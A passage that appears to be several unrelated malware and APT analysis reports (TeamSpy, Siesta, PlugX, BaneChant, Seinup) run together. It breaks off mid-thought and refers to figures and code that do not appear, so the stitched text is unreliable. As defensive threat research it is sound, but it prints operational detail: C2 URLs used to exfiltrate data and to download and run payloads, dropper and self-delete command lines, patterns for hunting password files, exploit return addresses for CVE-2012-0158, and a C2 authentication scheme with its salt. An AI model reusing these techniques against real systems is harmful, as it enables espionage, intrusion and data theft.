Then this file is opened and appended with new data received from Keylogger thread .
Please note , that at least empty file at XmlPath must be created , the keylogger starts saving collected data only if it finds file at XmlPath .
If the LogPath directory does n't exist , it will be created .
If the klg < Number > .klg
file becomes larger than 1Mb , new file at XmlPath is created and moved back to LogPath directory with new name klg < Number > .klg
( current tick counter value is used ) .
In the end LogPath directory is full of klg < Number > .klg
files , however there is a bug in this logics .
If the system is rebooted it will not contains XmlPath will not exist and that means that keylogger will not be active .
However it can still be activated any time by creating the XmlPath file .
The logs are stored in plaintext .
Below is a fragment of sample log from the keylogger module : * * * * * * * * * * * * * * * * * * * * * * * * * * * C : \Documents and Settings\User\My Documents\My Music * * * * * * * * * * * * * * * * * * * * * * * * * * * [ 18:47 - 13/03/2013 ; explorer.exe ; ] [ BACK ] [ BACK ] [ DOWN ] [ RIGHT ] [ LEFT ] [ RIGHT ] [ ENTER ] [ DOWN ] [ DOWN ] [ UP ] [ UP ] [ ENTER ] * * * * * * * * * * * * * * * * * * * * * * * * * * * Control Panel * * * * * * * * * * * * * * * * * * * * * * * * * * * [ 18:48 - 13/03/2013 ; explorer.exe ; ] [ LEFT ] [ LCTRL ] [ LEFT ] [ LSHIFT ] [ RIGHT ] [ LSHIFT ] C : \ [ ENTER ] Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 36'864 bytes .
Its main purpose it to dump contents of locally attached disk drives .
No file copying is done .
This tool simply collects information about the files such as file size and file last modification time .
This tool has internal code or `` build i d '' in the log file : 02.02.01 The main procedure starts from creating temporary file and prepare path for final output log , which is stored in '' % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt '' .
After that a new thread is created which enumerates network accessible resources , including shared directories and network printers and lists available files which names match any of hardcoded patterns .
The log string has the following format ( listing data ) : < Filepath > < FileSize > < Date of modification > < Time of modification > The resulting log file is prepended with special header : [ /N2.0 - 02.02.01.00 : < size of data > ] < listing data > List of filename patterns , which are used by the tool : * .doc – MS Word documents * .rtf – RTF documents * pass * .
* - various `` password '' files used by different applications * .pgp – PGP encrypted files * .xls – MS Excel spreadsheets * парол * - files which contain part of Russian word `` пароль '' meaning `` password '' * секрет * - files which contain Russian word `` секрет '' meaning `` secret '' * secret * .
* * saidumlo * - files which contain part of a Georgian transliterated word meaning `` secret '' The file has resource section which has 3 resources , 2 of them have resource language set to LANG_ENGLISH , SUBLANG_ENGLISH_US .
One of the resources contains the mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 36'352 bytes .
Its main purpose it to list all new network servers and available network shares .
No file copying is done .
The tool is identical to NetScanFiles2 , but instead of getting full information about files , it works only with servers and shares .
This tool has internal code or `` build i d '' in the log file : `` 02.01.01 '' The main procedure starts from creating temporary file and prepare path for final output log , which is stored in '' % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt '' .
After that a new thread is created which enumerates network accessible resources and outputs it to the temp file .
The log string has the following format : Server : < Server name > Share : < Share name > Domain : < Domain name > The resulting log file is prepended with special header : [ /N2.0 - 02.01.01.00 : < size of data > ] < collected data > The file has resource section which has 3 resources , 2 of them have resource language set to LANG_ENGLISH , SUBLANG_ENGLISH_US .
One of the resources contains the mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 755'193 bytes .
Its main purpose is to drop and run a legitimate tool known as CmdCapture , which makes a screenshot and stores it in `` sysdll5.jpg '' file .
The main procedure starts from extracting data embedded in the file of current application .
The code prepares some working strings : CmdCapture = C : \ProgramDara\CmdCapture\CmdCapture.exe LogFile = C : \ProgramData\Adobe\AdobeArm\sysdll555.txt LogDir = C : \ProgramData\Adobe\AdobeArm\ It checks magic number stored in the last 4 bytes of the file .
It must be 0xFFFFAAAA .
If the magic is found , it reads preceding 4 bytes .
This DWORD value ( PayloadLen ) indicates the size of the embedded data .
Then it copies PayloadLen bytes and to the CmdCapture file and executes the following command : cmd.exe /c C : \ProgramDara\CmdCapture\CmdCapture.exe /d C : \ProgramData\Adobe\AdobeArm\ /f sysdll5.jpg > C : \ProgramData\Adobe\AdobeArm\sysdll555.txt After that it attempts to self - delete .
The dropped CmdCaptures.exe has the following features : This is a standalone EXE file which is a benign AutoIt script tool to make a screenshot from the command line .
This tool is publicly available for download , i.e .
at the following URL : http : //www.softpedia.com / get / Multimedia / Graphic / Graphic - Capture / CmdCapture.shtml This tool has even a help prompt , which can be called with /h commandline argument .
Below is a part of it : CmdCapture 2.0 Usage : [ /d < directory > ] [ /f < filename > ] [ /h ] /d Select folder to output captured image files .
If you did n't specify file name with full path , or you left file name parameter blank , a file with default name will be put into the folder specified in this area .
/f Followed by the filename you 'd like to use .
CmdCapture uses the file extension to determine the output file type .
The extension should be one of the following values : png : Save a PNG file .
jpg : Save a JPEG file .
bmp : Save a Windows bitmap file .
tif : Save a TIFF file .
gif : Save a GIF file .
The default file type is PNG .
Known variants : PAGE 43 | The ' TeamSpy ' Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013 The file is a PE EXE file created in Microsoft Visual C++ 2005 .
Its size is 32768 bytes .
Its main purpose is to collect general system information , including what software is installed , what services and processes are running on the system , information about available local storage and its free space , user accounts and BIOS information .
This tool has internal code in the log file : 02.03.01 The main procedure starts from creating a temp file ( TmpLog ) and preparing a path for the final report : % SYSTEMDRIVE % : \ProgramData\Adobe\AdobeArm\sysdll2.txt ( FinalLog ) .
It runs series of commands and collects output : After that the output of all commands is aggregated in a single file FinalLog .
Every command output is prepended with a header in the following format : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 42496 bytes .
Its main purpose is to get information about local system in a safe way , which should n't trigger any security software , such as antivirus .
It is designed to collect information mostly about locally installed software .
The main procedure starts from creating a temp file to store preliminary tool report .
After that it lists all files in `` Program Files '' folder which are newer than hardcoded date : 22 November 1963 .
It collects environment variables from the following list : PAGE 45 | The ' TeamSpy ' Story - Abusing TeamViewer in Cyberespionage Campaigns | 20 March 2013 After that the tool collects list of running processes , which includes executable name and process ID .
Collected data is then prepended with a header and moved to the following file : One of the resources has mysterious icon of the application : Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 .
Its size is 34816 bytes .
Its main purpose is to get information about local network configuration , including IP addresses , DNS servers and possibly domain name .
The main procedure is very simple and includes creating a command line for cmd.exe : This commands will collect information about local network IP address and subnet of current computer , as well as DNS servers , domain name anfooter.jpg.idbd dump ARP table , which contains temporary records of IP and MAC addresses of local network computers .
The module attempts to self - delete after execution by calling `` cmd.exe /c del < ModulePath > '' command .
Known variants : The file is a PE EXE file created in Microsoft Visual C++ 2010 and packed with a Visual Basic wrapper .
Its size is 40.0 KB ( 40,960 bytes ) .
It is a dropper designed to copy , install itself , and maintain communcations with its C2 , maintain persistence , download further executable code , and enumerate windows looking for a browser to open and then log window contents .
Oddly , the module concatenates a couple of strings to run commands with cmd.exe and copy itself with several names , to several locations , with its final location residing in the All Users\Application Data directory and a run key for itself added .
First , it concats the string and copies itself to `` C : \Documents and Settings\All Users\Application Data\a - t_name.exe '' .
Then , it uses script commands to apply hidden attributes and further copy itself : This process immediately communicates with its hardcoded C2 at hxxp : //www.politnews.org / dd_4.php and hxxp : //www.bannetwork.org / dd_4.php , registering a unique identifier with its C2 .
It enumerates through process windows , looking for Internet Explorer processes and subclasses the window to steal all web browsing content and write it to c : \documents and settings\All Users\Application Data\sys32dll.txt , encrypting the data and sending stolen data back to the C2 .
In the past few weeks , we have received several reports of targeted attacks that exploited various application vulnerabilities to infiltrate various organizations .
Similar to the Safe Campaign , the campaigns we noted went seemingly unnoticed and under the radar .
The attackers orchestrating the campaign we call the Siesta Campaign used multicomponent malware to target certain institutions that fall under the following industries : Consumer goods and services Energy Finance Healthcare Media and telecommunications Public administration Security and defense Transport and traffic Threat actors do n't always rely on complex attack vectors to infiltrate an organization 's network .
Attackers can also make use of basic social engineering techniques for their victims to take the bait , such as in our case study below .
The Siesta Campaign : A Case Study We are currently investigating an incident that involved attackers sending out spear - phishing emails addressed to executives of an undisclosed company .
These emails were sent from spoofed email addresses of personnel within the organization .
Instead of using attachments and document exploits , this specific campaign served their malware through a legitimate - looking file download link .
To lure the target into downloading the file , the attacker serves the archive under a URL path named after the target organization 's name as cited below : http : // { malicious domain } / { organization name } / { legitimate archive name } .zip
This archive contains an executable ( TROJ_SLOTH ) disguised as a PDF document .
When executed , it drops and opens a valid PDF file , which was most probably taken from the target organization 's website .
Along with this valid PDF file , another malicious component is also dropped and executed in the background .
This backdoor component is named google { BLOCKED } .exe
.
( Due to the ongoing investigation , we are unfortunately unable to share hashes and filenames at this time .
) This backdoor connects to http : //www.micro { BLOCKED } .
com / index.html , which are its command - and - control ( C & C ) servers .
Trend Micro identifies these samples as BKDR_SLOTH.B .
At this point , the malware begins waiting for additional commands from the attacker .
The encrypted commands that are accepted are : Sleep : Commands the backdoor to sleep for specified number of minutes We have received a sleep command of `` sleep:120 '' during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C & C server Download : < download_url > Commands the backdoor to download and execute a file ( most probably another Win32 executable ) from a specified URL The C & C servers used in this campaign are found to be newly registered and also short - lived , making it difficult for us to track the malware 's behavior .
Based on our research , we found 2 variants of the malware used in this campaign .
Although not exactly alike , the behaviors are nearly identical .
One of the similar samples is a file named Questionaire Concerning the Spread of Superbugs February 2014.exe ( SHA1 : 014542eafb792b98196954373b3fd13e60cb94fe ) .
This sample drops the file UIODsevr.exe , its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C & C at skys { BLOCKED } com .
These samples are identified by Trend Micro as BKDR_SLOTH.A .
Both variants excessively use Sleep calls , which renders the malware dormant for varying periods of time , hence the campaign name `` Siesta '' ( which means to take a short nap in Spanish ) .
Commands are being served through HTML pages using different keywords as listed below : Variant 1 prefix : `` > SC < `` Variant 2 prefix : `` longDesc= '' suffix : `` .txt
'' Listed below are the backdoor commands we were able to see from our analysis : Variant 1 `` run1 '' – open a remote shell `` run2 '' – pipe shell commands from URL1 `` run3 '' – pipe shell commands from URL2 `` http '' – pipe shell commands from C2 `` x _ '' – sleep for specified number of minutes Variant 2 `` sleep : '' – sleep for specified number of minutes `` download : '' – download and execute another executable from C2 Attribution Attribution of campaigns and attack methods can often be difficult .
We were able to identify this new campaign through inspecting hashes , C & Cs , registrants , commands , and additional information .
Figure 1 .
Attribution Graph ( click the thumbnail for full view ) During the course of our investigation into this new campaign , we investigated the malware dropped .
We quickly noticed the registrant of sky { BLOCKED } .com
is also the same registrant as micro { BLOCKED } .com
and ifued { BLOCKED } .net
.
This individual used the name Li Ning and others with an email address of xiaomao { BLOCKED } @ 163.com .
This individual also recently registered 79 additional domains .
There are a total of roughly 17,000 domains registered with this same email address .
Figure 2 .
Domains registered under the name Li Ning , based on Whois data Conclusion Early detection is crucial in preventing targeted attacks from exfiltrating confidential company data .
Organizations and large enterprises need an advanced threat protection platform like Trend Micro™ Deep Discovery , which can mitigate the risks posed by targeted attacks through its various security technologies and global threat intelligence .
At the heart of our Custom Defense solution is Deep Discovery which provides real - time local and global intelligence across the attack life cycle .
This can help IT administrators understand the nature of the attack they are dealing with .
Trend Micro blocks all related threats , emails and URLs associated with these attacks .
As always , we advise users to exercise caution when opening emails and links .
With additional insights and analysis from Kervin Alintanahin , Dove Chiu , and Kyle Wilhoit .
This report is the analysis of a Remote Access Tool ( RAT ) which we call a variant of Plugx1 .
Plugx is an interesting piece of malware for several reasons : This work has been done with utmost care , following best practices in software reversing , forensic investigations and/or information gathering .
However , the work is only covering small aspects ( based on the indicators given , lacking full context ) and not an exhaustive analysis , and hence the report is as - is , not giving any guarantees of completeness or claiming absolute accuracy .
This work is provided for information only .
The document is classiﬁed as TLP : WHITE , CIRCL authorizes everyone to share this analysis report as - is without modiﬁcation .
The analyzed malicious software is an exhaustive Remote Access Tool ( RAT ) that defeats several protection methods of modern Windows operating systems , including execution of signed code and defeating UAC in Windows 7 .
It comes with a multitude of functionalities that are well implemented .
The analysis has been done using a mixed - approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware .
Some of the techniques might have also an impact on the interpretation of the malware .
Unfortunately , when we started this investigation , the IP address is no longer accepting connections on the given ports when tested on 2013 - 03 - 26 .
An interaction following the protocol of this malware is therefore no longer possible .
Sample A is a self - extracting archive which contains three ﬁles , Sample B , Sample C and Sample D. It is assumed that Sample A is a part of another attack vector , like PDF or Oﬃce document attacks where the user just opens a crafted document which exploits the document reader , drops and opens both a readable document and a malicious ﬁle like Sample A. Executing the self - extracting archive extracts the ﬁles and runs mcvsmap.exe ( Sample B ) .
Sample B is a valid signed ﬁle that the author of the malware took from a software bundle from McAfee .
Sample B , when executed , attempts to load a ﬁle McUtil . DLL from the same directory , which usually is another component of McAfee .
The malware author instead bundled the valid McAfee ﬁle Sample B with a custom DLL ( Sample C ) .
Since the ﬁle will be loaded without hesitation ( there are no protection mechanisms implemented ; neither does McAfee check if the imported ﬁle meets any conditions nor is any protection implemented for loading unsigned libraries in signed code ) , the signed Sample B jumps into the beginning of the code section of Sample C ( via Push / Return ) : The code retrieves the ﬁlename of itself ( line 3 ) , which is McUtil . DLL , and appends .PPT
( line 4 ) .
A handle to the ﬁlename McUtil . DLL.PPT is created in line 5 .
In line 12 an exectuable memory region is created , which is ﬁlled with the content of the ﬁle McUtil . DLL.PPT ( line 13 ) .
After closing the handle to the ﬁle ( line 15 ) , the memory region is called ( line 16 ) .
The next screenshot shows that the memory contains only pure code without any overhead like MZ / PE headers .
The entropy of this ﬁle is 7.997904 bits per byte : The code , when executed , reveals the ﬁrst hint about what we found : It decompresses and decrypts itself , using the Microsoft API call RtlDecompressBuﬀer and the custom decryption routine : The decrypted and decompressed ﬁle is not written onto disk , it always remains in memory .
Sample E is the extracted version of this memory segment .
At this point it can be mentioned that neither the encrypted Sample D nor the decrypted memory segment Sample E are detected by Virus scanners .
After some initialisation work like adjusting tokens ( SeDebugPrivilege , SeTcbPrivileg6 , to act as part of the operating system ) , a new process is started , the original svchost.exe from Microsoft , and the code from Sample E is injected into the memory of that process .
In a next step , svchost.exe is instructed to execute the original msiexec.exe from Microsoft , where also memory is injected like it has been done for svchost.exe .
Special conditions apply when run under Window 7 , which is protected by User Account Control ( UAC ) .
UAC is supposed to protect the user better from running malware by requesting the administator for approval before running a potentially dangerous application .
In the environment of Windows 7 , the malware drops temporarily ﬁle Sample F , which it uses to evade or defeat the UAC mechanism .
After killing the parent processes , only two processes are left : svchost and msiexec .
Both are veriﬁed binaries , none of the includes a malicious DLL .
Nevertheless , they both contain the malicious code .
At this point in time the malware is already talking to the C & C , no user interaction was required , all standard security mechanisms were defeated .
The analysis of Sample B revealed the commands as shown in the table below : Table 1 : Implemented commands XPlugOption implements commands to lock the workstation , shut it down or reboot it .
In addition , XPlugOption can create a thread that calls MessageBoxW ( ) in order to present a message box to the user .
XPlugDisk is used to enumerate connected disk drives and can be used to ﬁnd and manipulate ﬁles and directories .
In addition , XPlugDisk can be used to create a process , optionally on a hidden Windows desktop with the name `` HH '' , as the code below illustrates : XPlugScreen is not only taking screenshots , it is also implementing remote desktop capabilities .
It is able to capture the screen ( internal command : ScreenT1 ) and can send mouse and keyboard events ( internal command : ScreenT2 ) .
XPlugProcess implements three commands and is able to enumerate , create and kill processes .
In the module XPlugService commands are available related to Windows services .
Code is implemented to query service conﬁgurations , change service conﬁguration , start , control and delete services .
A remote shell for the attacker is created in the module XPlugShell , by creating an asynchronous set of pipes ( \pipe\a and \pipe\b ) for cmd.exe and the console attached to it ( AttachConsole ( ) ) .
cmd.exe /Q is executed in the module XPlugTelnet in order to start a telnet server on the attacked machine .
XPlugRegedit implements a set of commands to process the Windows registry .
It is able to enumerate , create , delete and copy keys .
It is also able to enumerate , set , delete and get values from the registry .
XPlugNethood is the module to enumerate network resources like network shares .
XPlugPortMap indicates that it performs some port mapping , however , the code is not under- stood , yet .
XPlugSQL implements three functions to query SQL servers : a function to get data source information , a function to get the driver description and a function to execute SQL statements .
XPlugNetstat gets the TCP and UDP connection table and is able to set TCP table entries .
The keylogger implemented in XPlugKeyLogger catches Window titles , date , time and logs entered keys into the ﬁle It has the format following the example below : This function is called almost everywhere when the author expects that a functions returns an error , at 1036 places .
This is obviously done to ensure code quality .
Example log ﬁle entries from ﬁle In addition an exception ﬁlter is installed to fetch the circumstances of otherwise not caught errors : The three ﬁles Sample B , C and D are copied into the directory respectively in After that , a new registry entry is set : which calls mcvsmap.exe ( Sample B ) after login .
Another option is the installation as a service in The key `` Imagepath '' calls the same binary mcvsmap.exe ( Sample B ) .
The attacked computer uses TCP and UDP to connect to port 443 on help.yahoo-upgrade.com ( 122.199.194.197 ) .
Unfortunately , the machine at that IP address does n't seem to reply to our requests anymore on 2013 - 03 - 26 .
The Passive DNS showed some other associated domains and hostnames with this IP address : It 's highly probable that theses hostnames were also used for other campaigns .
You might use these as additional indicators for the detection of potential infections .
The IP address is located in the ASN 17877 and the ISP is not a known bulletproof hoster as you can see on its historical7 BGP ranking evolution .
A version string can be found in this binary : This could mean PlugX , version 7.0 codename fking , build for mcvsmap .
References can be found on the internet for previous versions of this malware family : This section summarizes the known indicators of compromise .
The list might not be exhaustive , but the existence of any or all of the following indicators might help to discover an infection .
( where $ PID is the process ID of the active malicious process ) • Static ﬁles ( dropped ﬁles ) – update.exe – mcvsmap.exe – McUtil . DLL – McUtil . DLL.PPT – UAC.TMP Files and/or directories might be hidden and carry the system ﬂag • WHITE PAPER : PLUG X - PAYLOAD EXTRACTION – http : //www.contextis.com / files / PlugX_-_Payload_Extraction_March_2013_1 .
Last December , our senior malware researcher ( Mr. Abhishek Singh ) posted an article about a Trojan which could detect mouse clicks to evade sandbox analysis .
Interestingly , we have found another spear phishing document that downloads malware which incorporates improved mouse click detection anti- sandboxing capability .
It also leverages multiple advanced evasion techniques to achieve stealth and persistent infection .
The name of malicious document is translated to be `` Islamic Jihad.doc '' .
Hence , we suspect that this weaponized document was used to target the governments of Middle East and Central Asia .
This new malware is significant for several reasons : It detects multiple mouse clicks : In the past , evasion methods using mouse clicks only detected a single click , making the malware fairly easy to overcome .
The callback goes to a legitimate URL : Often when malware performs its callback , the communication goes directly to the CnC server .
In this case , the callback goes to a legitimate URL shortening service , which would then redirect the communication to the CnC server .
Automated blocking technologies are likely to block only the URL shortening service and not the CnC server .
It has anti - forensic capability : This malware does n't kick into high gear immediately .
Instead it requires an Internet connection for malicious code to be downloaded to the memory and executed .
Unlike predecessors that are very obvious and immediately get to work , this malware is merely a husk and its true malicious intent could only be found in the downloaded code .
This prevents forensic investigators from extracting the `` true '' malicious code from the disk .
Overall , this malware was observed to send information about the computer and set up a backdoor for remote access .
This backdoor provides the attacker the flexibility on how malicious activities could be executed .
After opening this malicious document , it attempts to download an XOR encoded binary ( using a two byte XOR key ) for the stage one payload .
It was also observed that the attacker leveraged a shortened URL to '' hide '' malicious domains from automated analysis technologies .
After investigation , the malicious domain was analyzed to be recently registered .
See Figure 1 for the first stage download scenario .
The attacker has designed the stage one malware to be merely a husk .
Having the decrypted executable file alone would not be useful in understanding its intent .
It is because a majority of the malicious code is only available after downloading the second stage payload .
The second stage payload was available as a fake '' JPEG '' file from the malicious server .
By designing the malware this way , it makes it harder to perform incidence response and facilitates ease of update of malicious code .
Again , in this second stage download , the malicious domain was not found in the malware .
It made use of the dynamic DNS service provided by '' NO - IP '' to indirectly access the malicious domain .
See Figure 2 for the second stage download scenario .
The technical details of each component ( shellcode and payload ) will be further elaborated .
The spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012 - 0158 .
By executing return at 0x27606EFF , it will load EIP with address 0x27583C30 which is translated to be JMP ESP to execute shellcode in the stack .
See the figure below .
Like most modern shellcode , its stub decrypts its body using a simple XOR key ( see Figure 4 ) .
By stepping through the shellcode , it attempts to download hxxp : //ow.ly / iGKKT and saves it to the temp directory with a file name prefixed with `` moo '' , e.g. , `` moo1.tmp '' ( see Figure 5 ) .
It is important to note that `` ow.ly '' is not a malicious domain .
Instead , it is a URL shortening server .
It is believed that the rational for such indirect access is to defeat automated URL blacklisting .
Figure 6 depicts how a malicious URL could be shortened using this service .
From the network traffic , it is obvious that the real malicious content is located at hxxp : //symbisecure.com / update / winword.pkg ( see Figure 7 ) .
As an excecutable file usually contains many zeros in series , the zeros would become the XOR key when XOR encoded .
For example , 0xAA xor 0×00 equals to 0xAA .
By examining the content using a hex editor , it is obvious that there are many `` 9E 44 '' repeated .
Hence , by trying 0x449E ( little endian ) as an XOR key , it would reveal that it is a PE file .
At offset zero , it is decrypted to be `` MZ '' ; at offset 0x3C , it is decrypted to be 0x00000E0 ; and at 0x000000E0 , it is decrypted to be PE ( see Figure 8 ) .
By generalizing this idea , the single or double byte XOR key can be seen as a dword XOR key as it repeats over itself .
For example , 0x449E XOR key could be seen as 0x449E449E .
By counting the DWORD with the highest occurance , it could be a probable XOR key if the file is XOR encrypted .
This should work for samples that are ( 1 , 2 or 4 , but not 3 bytes ) XOR encrypted .
Even though `` winword.pkg '' is an executable husk to host malicious code downloaded at the second stage , it contains a mouse - click check to detect human behaviors .
Only if the number of left clicks is three or more , will the malware proceed further to download the second stage payload – the true malicious code ( see Figure 9 and Figure 10 ) .
After the malware detects sufficient mouse clicks , it proceeds to decrypt its malicious URL to download the second stage payload ( see Figure 11 ) .
By following the TCP stream ( see Figure 12 ) and examining the header of the downloaded JPG file , it is obvious that downloaded content is not a JPEG file .
By doing so , it effectively downloaded an executable content that is not conformed to PE format to defeat network binary extraction .
A legitimate JPG file should contain the byte sequence `` FFD8FFE0xxxx4A46494600 '' at offset zero , where `` 4A464946 '' corresponds to `` JFIF '' .
Below is the hardcoded URL and user - agent that is used by this malware sample .
URL : hxxp : //kibber.no - ip.org / adserv / logo.jpg User - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; SV2 ) After the JPG file is downloaded and executed directly in the memory , it achieves persistency by creating a shortcut link file at the start up folder .
This link file will execute a copy of itself located at '' C : \ProgramData\Google2\GoogleUpdate.exe '' ( see Figure 13 ) .
It would look legitimate to users as it masquerades as a legitimate Google Updater .
It `` would '' appear normal if it attempts to access the Internet .
In comparison , the real `` GoogleUpdate.exe '' resides in `` program files '' instead `` program data '' directory ( see Figure 14 ) .
The downloaded `` JPG '' file was analyzed to be a backdoor in the victim 's machine .
It lists the running processes , IP configuration , and directories of root drives ( C to H ) as depicted in Figure 15 .
This information is posted to hxxp : //symbisecure.com / adserv / get.php in Base-64 format .
After decoding , it is interesting that it begins with a Tag named `` BaneChant '' .
After doing a quick search , it seems to be a sound track composed by Hans Zimmer for the movie `` The Dark Knight Rises '' ( see Figure 16 ) .
This is the reason we name this malware Trojan . APT.BaneChant .
As depicted in Figure 17 , the malware could perform other tasks as listed below .
1 .
Command ' g ' : Download and execute a file .
The downloaded file has a temporarily file name prefixed with `` java '' .
2 .
Command ' i ' : Run downloaded code ( fileless ) as a separate thread .
The user - agent used is `` Mozilla/5.0 ( Windows NT 5.1 ) AppleWebKit/535.1 ( KHTML , like Gecko ) '' .
3 .
Command ' x ' : Download and execute , follow by an uninstallation of `` GoogleUpdate.exe '' .
The downloaded file has same prefix `` java '' .
4 .
Command ' u ' : Uninstall `` GoogleUpdate.exe '' As defense technologies advance , malware also evolves .
In this instance , we could see that the malware has performed a number of tricks to defeat detection .
It attempts to : 1 .
Evade sandbox by detecting human behaviors ( multiple mouse clicks ) ; 2 .
Evade network binary extraction technology by performing multi - byte XOR encryption on executable file ; 3 .
Social engineer user into thinking that the malware is legitimate ; 4 .
Avoid forensic and incidence response by using fileless malicious codes ; and 5 .
Prevent automated domain blacklisting by using redirection via URL shortening and Dynamic DNS services .
The FireEye research team has recently identified a number of spear phishing activities targeting Asia and ASEAN .
Of these , one of the spear phishing documents was suspected to have used a potentially stolen document as a decoy .
The rich and contextual details ( body and metadata ) which are not available online lead us to believe this was stolen .
This decoy document mentioned countries such as Brunei , Cambodia , Indonesia , Laos , Malaysia , Myanmar , Philippines , Singapore , Thailand , and Vietnam , which leads us to suspect that these countries are targeted .
As the content of this decoy document is suspected to be a stolen sensitive document , the details will not be published .
This malware was found to have used a number of advance techniques which makes it interesting : 1 .
The malware leverages Google Docs to perform redirection to evade callback detection .
This technique was also found in the malware dubbed `` Backdoor . Makadocs '' reported by Takashi Katsuki ( Katsuki , 2012 ) .
2 .
It is heavily equipped with a variety of cryptographic functions to perform some of its functions securely .
3 .
The malicious DLL is manually loaded into memory which hides from DLL listing .
As depicted in the diagram below , the spear phishing document ( which exploits CVE-2012 - 0158 ) creates a decoy document and a malware dropper named exp1ore.exe .
This dropper will then drop wab.exe ( Address Book Application ) and wab32res.dll ( malicious DLL ) inside the temp folder .
By running wab.exe , the malicious DLL named wab32res.dll ( located within the same folder ) will be loaded using DLL side - loading technique .
This will in turn install a copy of wab32res.dll as msnetrsvw.exe inside the windows directory to be registered as Windows service .
By registering as a Windows service , it allows the malware to survive every reboot and persist on the network .
This malware is named `` Trojan . APT.Seinup '' because one of its export functions is named `` seinup '' .
This malware was analysed to be a backdoor that allows the attacker to remote control the infected system .
Based on our threat intelligence and reverse - engineering effort , below are some related domain and MD5 sums .
Please note that some of the domain / IP association may change .
By connecting the malicious server via Google Docs , the malicious communication is protected by the legitimate SSL provided by Google Docs ( see Figure below ) .
One possible way to examine the SSL traffic is to make use of a hardware SSL decrypter within an organisation .
Alternatively , you may want to examine the usage pattern of the users .
Suppose a particular user accesses Google Docs multiple times a day , the organization 's Incident Response team may want to dig deeper to find out if the traffic is triggered by a human or by malware .
Below is the code that is used to construct a URL that retrieves command via Google Docs .
First , the malicious URL is constructed and then encoded .
Next , the malware simply leverages the Google Docs viewer to retrieve the command from the malicious server ( see Figure below ) .
The shellcode encryption technique is fairly standard .
The shellcode has a decryption stub which decrypts its body using the XOR key 0x9E , and this shellcode is used to extract exp1ore.exe ( malware ) and Wor.doc ( benign document ) .
The exp1ore.exe and Wor.doc were found within the spear phishing document encrypted using the same key ( 0xFC ) and technique .
The XOR key decrypts only a non - zero byte ( see Figure 5 ) .
This prevents statistical methods of recovering the XOR key .
The encrypted executable file and benign document were identified to be located inside the spear phishing document at offsets 0×2509 and 0×43509 respectively .
Even though statistical methods may not be useful in identifying the XOR key as the zero bytes are not encrypted , we could use some of the `` known '' strings below to hunt for the XOR key in this situation .
By sliding the known string across the array of bytes to perform a windowed XOR , the key would be revealed when the encoded data is XORed with the known string .
`` This program can not be run in DOS mode '' `` KERNEL32.dll '' `` LoadLibraryA '' The malware performs the callback in a secure manner .
It uses a custom Base64 map to encode its data , and creates a salted digital thumbprint to allow validation of data .
Below describes the steps to validate a callback using an example of the following URL : hxxp : //www.elizabearden.com / waterphp / BYyH.php ? dEIXozUlFzx=5P & wDq=6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== & k4fJdSp7=cc3237bc79192a096440faca0fdae10 & GvQF2lotIr5bT2= The URL could be generalised as follows : Domain/ < PHP > ? < rand 11 - 13 char > = < A ' > & < rand 3 - 5 char > = < B ' > & < rand 7 - 9 char > = < C ' > & < rand 14 - 16 chars > = < D ' > The definition of A ' , B ' , C ' and D ' are as follows : Let H be the function which encodes binary into hexadecimal characters prepend with `` % '' , if it is not alphanumeric , dash , underscore or dot .
Let B64 be the base 64 encoder using the following custom map , `` URPBnCF1GuJwH2vbkLN6OQ/5S9TVxXKZaMc8defgiWjmo7pqrAstyz0D+El3I4hY '' .
Let PT be the plain text which is in the form of `` < HostName > [ < RunType > ] : < IPAddress > { 1 } '' , where HostName and IPAddress are string , and RunType is a character .
Let A be the random of 3 to 7 characters , and A ' = H ( A ) Let B be B64 ( PT ) , and B ' = H ( B ) Let C be 32 char deliminator , and C ' = H ( C ) Let D be H ( MD5 ( salt + MD5 ( B64 ( PT ) + A + C ) ) ) , salt = `` % ^^*HFH ) * $ FJK ) 234sd2N @ C ( JGl2z94cg23″ , and D ' = H ( D ) Hence , in this case , the specific malicious URL could be applied as follows : Domain/ < PHP > = http : //www.elizabearden.com / waterphp / BYyH.php A ' = `` 5Pb '' B ' = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S % 2Bw8npH5oAZk== '' C ' = `` cc3237bc79192a096440faca0fdae107 '' D ' = `` 349118df672db38f9e65659874b60b27 '' ( This is the digital signature ) The hash could be verified as follow : B64 ( PT ) + A + C = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== '' + `` 5Pb '' + `` cc3237bc79192a096440faca0fdae107 '' MD5 ( B64 ( PT ) + A + C ) = `` 766cf9e96c1a508c59f7ade1c50ecd28 '' MD5 ( salt + MD5 ( B64 ( PT ) + A + C ) ) = MD5 ( `` % ^^*HFH ) * $ FJK ) 234sd2N @ C ( JGl2z94cg23 '' + `` 766cf9e96c1a508c59f7ade1c50ecd28 '' ) = 349118df672db38f9e65659874b60b27 ( This equals to D ' , which means verified ) The encoded plain text ( B ) could be recovered : B64 ( PT ) = `` 6QeZky42OCQOLQuZ6dC2LQ7F56iAv6GpH6S+w8npH5oAZk== '' ; PT = `` MY_COMPUTER_NAME [ F ] : 192.168.1.1 { 1 } '' , where `` MY_COMPUTER_NAME '' is the hostname , ' F ' is the run type , `` 192.168.1.1 '' is the IP address .
Note : This example is mocked up using a dummy computer name and IP address .
The python code below could be used to decode the custom encoded string ( see Figure below ) .
The malware was found to perform a callback at random intervals so as to evade network investigation when looking for network connections that are performed in a regular interval .
Additionally , even the name of the parameters in the get string have a random length and name , which makes it hard to create a fix signature to detect such callbacks ( see 3.3.1 to understand how a callback is created ) .
On the disk , the malicious code is either encrypted or compressed to evade scanning using signature rules .
